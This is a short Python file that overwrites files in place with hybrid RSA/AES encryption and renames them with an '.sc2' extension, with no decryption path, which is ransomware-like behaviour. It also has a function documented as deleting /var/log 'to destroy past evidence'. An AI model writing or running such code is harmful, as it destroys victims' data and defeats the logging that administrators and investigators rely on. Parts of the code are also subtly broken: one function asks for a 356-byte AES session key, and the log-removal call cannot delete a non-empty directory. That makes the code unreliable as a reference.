import os

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes


def encrypt(f:str):
    """
    Encrypts a given file with the default public key
    """
    with open(f, "rb") as file:
        data = file.read()

    recipient_key = RSA.import_key(open("seal.pem").read())
    session_key = get_random_bytes(32)

    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    with open(f, "wb") as file:
        file.write(enc_session_key)
        file.write(cipher_aes.nonce)
        file.write(tag)
        file.write(ciphertext)
    os.rename(f, f + ".sc2")


def fast_encrypt(f:str,pub_key:bytes):
    """
    Encrypts a file with a given public key
    """
    with open(f, "rb") as file:
        data = file.read()

    recipient_key = RSA.import_key(pub_key)
    session_key = get_random_bytes(356)

    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    with open(f, "wb") as file:
        file.write(enc_session_key)
        file.write(cipher_aes.nonce)
        file.write(tag)
        file.write(ciphertext)
    os.rename(f, f + ".sc2")


def main(file:str):
    """
    Encrypt a file using the default option of keys stored in text files
    """
    encrypt(file)


def off_to_see_the_wizard():
    """
    Deletes the /var/log directory in order to destroy past evidence
    """
    os.rmdir("/var/log")
    return True
